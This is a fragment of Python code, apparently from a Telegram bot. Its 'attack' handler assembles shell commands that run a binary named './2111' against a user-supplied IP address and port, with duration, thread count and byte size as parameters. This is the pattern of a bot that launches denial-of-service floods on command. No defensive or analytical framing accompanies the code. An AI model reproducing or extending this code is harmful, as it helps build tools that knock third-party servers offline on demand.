...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./2111 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./2111 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./2111 {ip} {port} {duration} {byte_size} {threads}"
